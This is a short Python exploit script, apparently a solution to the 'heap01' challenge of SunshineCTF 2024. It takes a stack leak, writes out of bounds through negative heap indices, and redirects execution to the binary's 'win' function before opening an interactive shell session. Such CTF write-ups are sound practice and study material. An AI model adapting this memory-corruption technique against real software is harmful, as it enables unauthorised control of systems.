from gdb_plus import *

fname = './heap01'
e = ELF(fname, checksec=False)

dbg = Debugger(fname, script='init-gef').remote('2024.sunshinectf.games', 24006)

io = dbg.p

# dbg.b('func0+337')
dbg.c(wait=False)

io.sendlineafter(b'leak? \n', b'')
stack_leak = int(io.recvline().strip()[2:].decode(), 16) + 0x20
log.info(f'{stack_leak = :016x}')
io.sendlineafter(b'size: \n', b'24')

offset = 0x1aab010 - 0x1aac2b0
assert offset % 8 == 0
idx1 = offset // 8
idx2 = (offset + 128) // 8

log.info(f'{idx1 = }, {idx2 = }')

io.sendlineafter(b'Index: \n', f'{idx1}'.encode())
io.sendlineafter(b'Value: \n', b'1')

io.sendlineafter(b'Index: \n', f'{idx2}'.encode())
io.sendlineafter(b'Value: \n', f'{stack_leak}'.encode())

io.sendlineafter(b'Value 1: \n', b'2137')
io.sendlineafter(b'Value 2 - \n', f'{e.sym["win"] + 25}'.encode())
io.sendlineafter(b'Value 3 -> \n', b'2137')

io.interactive()